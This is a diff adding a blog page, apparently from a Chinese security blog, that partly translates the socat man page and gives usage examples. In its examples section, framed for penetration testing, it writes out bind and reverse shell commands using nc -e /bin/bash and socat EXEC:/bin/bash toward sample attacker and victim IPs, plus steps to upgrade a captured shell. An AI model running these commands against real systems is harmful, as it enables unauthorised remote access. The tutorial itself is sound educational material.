@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="basics," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="用nc吗？不存在的。LCX不错，下次可以讲讲。">
+<meta name="keywords" content="basics">
+<meta property="og:type" content="article">
+<meta property="og:title" content="神器之Socat-Man page简译">
+<meta property="og:url" content="/2018-01-04-Tools-Socat-Man-page/index.html">
+<meta property="og:site_name" content="Security blog">
+<meta property="og:description" content="用nc吗？不存在的。LCX不错，下次可以讲讲。">
+<meta property="og:updated_time" content="2018-01-04T06:57:57.998Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="神器之Socat-Man page简译">
+<meta name="twitter:description" content="用nc吗？不存在的。LCX不错，下次可以讲讲。">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="/2018-01-04-Tools-Socat-Man-page/"/>
+
+
+
+
+
+  <title>神器之Socat-Man page简译 | Security blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Security blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="/2018-01-04-Tools-Socat-Man-page/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ꭰ">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Security blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">神器之Socat-Man page简译</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-04T13:16:27+08:00">
+                2018-01-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Linux/" itemprop="url" rel="index">
+                    <span itemprop="name">Linux</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>用<em>nc</em>吗？不存在的。<em>LCX</em>不错，下次可以讲讲。<a id="more"></a></p>
+<h3 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">socat [options] &lt;address&gt; &lt;address&gt;</div><div class="line">socat -V</div><div class="line">socat -h[h[h]]  | -?[?[?]]</div><div class="line">filean</div><div class="line">procan</div></pre></td></tr></table></figure>
+<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p><em>socat</em>是一款命令行工具，通常用来创建双向的字节流并在其之间传输数据。因为流结构的多样性和数据流的类型繁多，且<em>socat</em>可以使用多个参数来调整流的工作方式，所以它的应用场景非常广。</p>
+<p><em>Filan</em>用于将活跃的<em>fd</em>信息输出到<em>stdout</em>，其目的是用于调试<em>socat</em>。</p>
+<p><em>Procan</em>用于将进程参数的信息输出至<em>stdout</em>，其目的是便于理解<em>UNIX</em>的进程属性和调试</p>
+<h3 id="socat生命周期"><a href="#socat生命周期" class="headerlink" title="socat生命周期"></a><em>socat</em>生命周期</h3><p><em>socat</em>的生命周期有四个阶段。</p>
+<ol>
+<li>初始阶段，命令行参数被解析、日志记录被初始化</li>
+<li>建立连接阶段，<em>socat</em>先后打开第一个<em>addr</em>和第二个<em>addr</em>，这个过程是阻塞的。特别是像<em>socks</em>这种复杂的地址，建立连接请求或授权对话必须在下一步开始之前完成。</li>
+<li>传输阶段，<em>socat</em>会通过<em>select()</em>来观察流的读写<em>fd</em>,当某一边的数据可以访问且另外一边可以写入时，<em>socat</em>会进行读的操作并按需读入换行符，接着向流的另外一侧写入数据。接着继续观察两侧的数据动向</li>
+<li>断开连接阶段，当<em>socat</em>从一侧收到了<em>EOF</em>，断开连接阶段就开始了。<em>Socat</em>会将<em>EOF</em>传输到流的另外一侧。</li>
+</ol>
+<h3 id="地址规范"><a href="#地址规范" class="headerlink" title="地址规范"></a>地址规范</h3><p>用户可以通过<em>address command line arguments</em>来创建自己需要的字节流。</p>
+<p>通常情况下，地址由<strong><em>address type</em></strong>和<strong><em>address parameters</em></strong>组成，多个键值对需<strong><em>:</em></strong>分隔，其他非必须的<em>address option</em>以逗号<strong><em>,</em></strong>分隔。</p>
+<p><strong>地址类型</strong>: <em>TCP4</em>,<em>OPEN</em>,<em>EXEC</em>(特殊情况 <strong><em>-</em></strong> 代表<em>STDIO</em>,<em>TCP</em>代表<em>TCP4</em>)。关键字是大小写不敏感的。对于部分特殊的<em>地址类型</em>来说，可以省略关键字。比如说以数字为开始的类型会被认为是<em>FD</em>地址，又或者是在<em>:</em>之前发现了<em>/</em>或者逗号<em>,</em>，<em>socat</em>会默认是<em>GOPEN</em>（<em>Generic file open</em>）。</p>
+<p>通常<em>address parameters</em>是根据<em>address type</em>来决定的。比如说<em>TCP4</em>要求参数指定为服务器地址和端口或服务。</p>
+<p>每个地址后面或许会跟着多个<em>address options</em>，这些<em>options</em>会间接或直接的影响<em>address</em>。<em>OPTIONS</em>通常是由<em>option</em>关键字和<em>option</em>键值对组成。<em>option</em>关键字是大小写不敏感的。为了筛选对<em>address type</em>有用的<em>options</em>，每个<em>option</em>都有自己的<em>option group</em>。对于每种<em>address type</em>，只有一组<em>option group</em>能够使用。</p>
+<p>符合上述规范的地址规范可以叫做<em>单地址规范</em>。两个单独的地址通过<em>!!</em>可以形成一个频道的<em>dual type address</em>。<em>socat</em>使用第一个地址来读取数据，第二地址来写数据。将一个<em>option</em>同时应用于两个<em>single address</em>是不可能的。</p>
+<p>通常情况下，<em>address</em>默认是以读写模式打开的。如果地址是<em>dual address</em>中的一部分，或者指定了<em>option  -u 或者 -U</em>，这个情况下需要考虑地址可能只是用来读或者写了。</p>
+<p><em>socat</em>版本高于1.5.0，词法分析会尝试处理单引号和括号以及特殊字符的转义。如果发现<em>({[‘</em>符号，词法分析会去寻找对应的闭合符合。这些符合能够嵌套使用，在这些符号中，<em>socat</em>默认的特殊字符<em>:,!!</em>就会失去原来的意义。所有的这些字符都可以通过<em>\</em>来转义。</p>
+<h3 id="地址OPTIONS"><a href="#地址OPTIONS" class="headerlink" title="地址OPTIONS"></a><em>地址OPTIONS</em></h3><p><em>address options</em>可用于影响打开地址的过程以及数据频道的属性。</p>
+<p>并不是每个<em>option</em>都能适用于每个<em>address type</em>，这是个技术上层面的原因。比如说无法将<em>socket option</em>应用于<em>regular file</em>。为了尽可能早地捕获最多的无用组合，<em>socat</em>引入了<em>option group</em>概念。每个<em>option</em>属于一个或者多个<em>option groups</em>。<em>Options</em>只能用于那些支持它们<em>options group</em>组的<em>address type</em>。</p>
+<p><em>address options</em>对数据类型有要求。每个<em>address option</em>都有由一个关键字或者关键字跟着<em>=value</em>组成。中值必须符合选项类型。一些地址选项操纵系统调用的参数;例如，选项同步用open（）调用设置O_SYNC标志。其他选项会导致系统或库调用;例如，通过选项ttl = value’，将应用setsockopt（fd，SOL_IP，IP_TTL，value，sizeof（int））调用。其他选项设置数据传输期间使用的内部socat变量;例如`crnl’会导致显式的字符转换。一些选项有更复杂的实现;例如，su-d（子用户延迟的）查询一些用户和组信息，存储它们，并在可能的chroot（）调用之后稍后应用它们。</p>
+<p>如果一个地址指定了多个<em>option</em>，他们的位置顺序并不影响执行顺序。相反，<em>socat</em>有内置的<em>option phase</em>。有些<em>option</em>会以不同的形式存在以便控制执行时长。</p>
+<h3 id="举个例子"><a href="#举个例子" class="headerlink" title="举个例子"></a>举个例子</h3><h4 id="完美shell"><a href="#完美shell" class="headerlink" title="完美shell"></a>完美shell</h4><p>在渗透过程中，获取到<em>shell</em>是必不可少的一步。但是在大多数情况下，我们拿到的<em>shell</em>都无法读取命令的历史记录以及执行<em>ctrl+c</em>或<em>ctrl+z</em>的命令。所以，一个完美的<em>shell</em>是非常有必要的。</p>
+<h5 id="Python"><a href="#Python" class="headerlink" title="Python"></a><em>Python</em></h5><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></div></pre></td></tr></table></figure>
+<h5 id="Socat"><a href="#Socat" class="headerlink" title="Socat"></a><em>Socat</em></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#Listener</span></div><div class="line">socat file:`tty`,raw,<span class="built_in">echo</span>=0 tcp-listen:4444</div><div class="line"><span class="comment">#Victim</span></div><div class="line">socat <span class="built_in">exec</span>:<span class="string">'bash -li'</span>,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444</div></pre></td></tr></table></figure>
+<h5 id="perefect-shell"><a href="#perefect-shell" class="headerlink" title="perefect shell"></a><em>perefect shell</em></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># In reverse shell</span></div><div class="line">$ python -c <span class="string">'import pty;pty.spawn("/bin/bash")'</span></div><div class="line">Ctrl-Z  <span class="comment"># 挂起进程</span></div><div class="line"></div><div class="line"><span class="comment"># In kali</span></div><div class="line">$ stty raw -echo   <span class="comment"># 关闭回显</span></div><div class="line">$ <span class="built_in">fg</span></div><div class="line"></div><div class="line"><span class="comment"># In reverse shell</span></div><div class="line">$ reset</div><div class="line">$ <span class="built_in">export</span> SHELL=bash</div><div class="line">$ <span class="built_in">export</span> TERM=xterm-256color</div><div class="line">$ stty rows &lt;num&gt; columns &lt;cols&gt;</div></pre></td></tr></table></figure>
+<h4 id="正反shell"><a href="#正反shell" class="headerlink" title="正反shell"></a>正反shell</h4><p>假设<em>Attacker</em>的<em>IP</em>为10.1.1.1，<em>Victim</em>的<em>IP</em>为10.1.1.2</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 正向shell</span></div><div class="line"><span class="meta">#</span><span class="bash"> Victim</span></div><div class="line"><span class="meta">$</span><span class="bash"> nc -lp 2233 <span class="_">-e</span> /bin/bash</span></div><div class="line"><span class="meta">$</span><span class="bash"> socat TCP-LISTEN:2233 EXEC:/bin/bash</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> Attacker</span></div><div class="line"><span class="meta">$</span><span class="bash"> nc 10.1.1.1 2233</span></div><div class="line"><span class="meta">$</span><span class="bash"> socat READLINE TCP-CONNECT:10.1.1.1:2233</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> 反向shell</span></div><div class="line"><span class="meta">#</span><span class="bash"> Attacker</span></div><div class="line"><span class="meta">$</span><span class="bash"> nc -lp 2233 </span></div><div class="line"><span class="meta">$</span><span class="bash"> socat TCP-L:2233 READLINE</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> Victim</span></div><div class="line"><span class="meta">$</span><span class="bash"> nc 10.1.1.2 2233 <span class="_">-e</span> /bin/bash</span></div><div class="line"><span class="meta">$</span><span class="bash"> socat TCP-CONNECT:10.1.1.2:2233 EXEC:/bin/bash</span></div></pre></td></tr></table></figure>
+<h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ socat TCP-L:223,reuseaddr,fork TCP:www.baidu.com:80</div><div class="line">$ <span class="built_in">echo</span> <span class="_">-e</span> <span class="string">"GET /\n"</span> | socat TCP:127.0.0.1:223 -</div></pre></td></tr></table></figure>
+<h4 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> socat -u - /tmp/<span class="built_in">test</span></span></div><div class="line">testNo1</div><div class="line"><span class="meta">$</span><span class="bash"> cat /tmp/<span class="built_in">test</span></span></div><div class="line">testNo1</div><div class="line"><span class="meta">$</span><span class="bash"> socat -U /tmp/<span class="built_in">test</span>2 -</span></div><div class="line">TestNo2</div><div class="line"><span class="meta">$</span><span class="bash"> cat /tmp/<span class="built_in">test</span>2</span></div><div class="line">TestNo2</div></pre></td></tr></table></figure>
+<h4 id="端口复用"><a href="#端口复用" class="headerlink" title="端口复用"></a>端口复用</h4><p>这个没有复现成功，记录下失败的步骤吧。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># nginx配置文件中修改server为 reuseport</span></div><div class="line"><span class="comment"># 重启nginx，此时端口80被nginx占用，使用socat进行80端口绑定</span></div><div class="line">$ socat TCP-L:80,reuseaddr,reuseport,fork -  <span class="comment"># 失败，提示端口占用</span></div></pre></td></tr></table></figure>
+<p>网上大部分的教程都是说《Unix网络编程》<em>SO_REUSEADDR</em></p>
+<blockquote>
+<p>SO_REUSEADDR允许启动一个监听服务器并捆绑其众所周知端口，即使以前建立的将此端口用做他们的本地端口的连接仍存在。这通常是重启监听服务器时出现，若不设置此选项，则bind时将出错。</p>
+<p>SO_REUSEADDR允许在同一端口上启动同一服务器的多个实例，只要每个实例捆绑一个不同的本地IP地址即可。对于TCP，我们根本不可能启动捆绑相同IP地址和相同端口号的多个服务器。</p>
+<p>SO_REUSEADDR允许单个进程捆绑同一端口到多个套接口上，只要每个捆绑指定不同的本地IP地址即可。这一般不用于TCP服务器。</p>
+<p>SO_REUSEADDR允许完全重复的捆绑：当一个IP地址和端口绑定到某个套接口上时，还允许此IP地址和端口捆绑到另一个套接口上。一般来说，这个特性仅在支持多播的系统上才有，而且只对UDP套接口而言（TCP不支持多播）。</p>
+</blockquote>
+<p><em>SO_REUSEPORT</em></p>
+<blockquote>
+<p>此选项允许完全重复捆绑，但仅在想捆绑相同IP地址和端口的套接口都指定了此套接口选项才行。<br>如果被捆绑的IP地址是一个多播地址，则SO_REUSEADDR和SO_REUSEPORT等效。</p>
+</blockquote>
+<p>使用这两个套接口选项的建议：</p>
+<blockquote>
+<p>在所有TCP服务器中，在调用bind之前设置SO_REUSEADDR套接口选项；</p>
+</blockquote>
+<h3 id="Socat之坑点"><a href="#Socat之坑点" class="headerlink" title="Socat之坑点"></a><em>Socat之坑点</em></h3><ol>
+<li>大小写不敏感</li>
+<li><em>READLINE</em>是GNU才有的历史命令编辑，故而不适用于<em>Ubuntu</em>、<em>Debian</em></li>
+<li>不同的<em>Address Type</em>接受的参数不同，比如<em>TCP-LISTEN</em>和<em>TCP-CONNECT</em>，前者只能接端口，后者则是<em>host</em>和<em>port</em>。</li>
+<li>如果要自行查阅<em>man page</em>，建议先搞懂<em>options argument parameter</em>的区别</li>
+</ol>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ol>
+<li><a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="external">upgrading-simple-shells-to-fully-interactive-ttys</a></li>
+<li><a href="https://stackoverflow.com/questions/36495669/difference-between-terms-option-argument-and-parameter" target="_blank" rel="external">difference-between-terms-options-argument-and-parameter</a></li>
+<li><a href="http://www.dest-unreach.org/socat/doc/socat.html#OPTION_REUSEADDR" target="_blank" rel="external">Man-page-Socat</a></li>
+<li><a href="https://xianzhi.aliyun.com/forum/topic/4/" target="_blank" rel="external">聊聊端口复用的实现和坑点</a></li>
+<li><a href="https://threathunter.org/topic/594545184ea5b2f5516e2033" target="_blank" rel="external">远程遥控 IPTables 进行端口复用</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/basics/" rel="tag"># basics</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017-12-31-lucky-to-get-root/" rel="next" title="碰巧就成为root了？">
+                <i class="fa fa-chevron-left"></i> 碰巧就成为root了？
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+    <div class="comments" id="comments">
+      <div id="lv-container" data-id="city" data-uid="MTAyMC8yODY0MC81MjEx"></div>
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Ꭰ</p>
+              <p class="site-description motion-element" itemprop="description">Me. a lazy person</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">42</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">41</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://suroot.cn" title="c0rpse" target="_blank">c0rpse</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://www.th1s.cn" title="th1s" target="_blank">th1s</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://jkme.github.io" title="jkme" target="_blank">jkme</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#基本语法"><span class="nav-number">1.</span> <span class="nav-text">基本语法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#描述"><span class="nav-number">2.</span> <span class="nav-text">描述</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#socat生命周期"><span class="nav-number">3.</span> <span class="nav-text">socat生命周期</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#地址规范"><span class="nav-number">4.</span> <span class="nav-text">地址规范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#地址OPTIONS"><span class="nav-number">5.</span> <span class="nav-text">地址OPTIONS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#举个例子"><span class="nav-number">6.</span> <span class="nav-text">举个例子</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#完美shell"><span class="nav-number">6.1.</span> <span class="nav-text">完美shell</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#Python"><span class="nav-number">6.1.1.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#Socat"><span class="nav-number">6.1.2.</span> <span class="nav-text">Socat</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#perefect-shell"><span class="nav-number">6.1.3.</span> <span class="nav-text">perefect shell</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#正反shell"><span class="nav-number">6.2.</span> <span class="nav-text">正反shell</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口转发"><span class="nav-number">6.3.</span> <span class="nav-text">端口转发</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#写入文件"><span class="nav-number">6.4.</span> <span class="nav-text">写入文件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#端口复用"><span class="nav-number">6.5.</span> <span class="nav-text">端口复用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Socat之坑点"><span class="nav-number">7.</span> <span class="nav-text">Socat之坑点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2017 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ꭰ</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.3"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.3"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.3"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.3"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.3"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
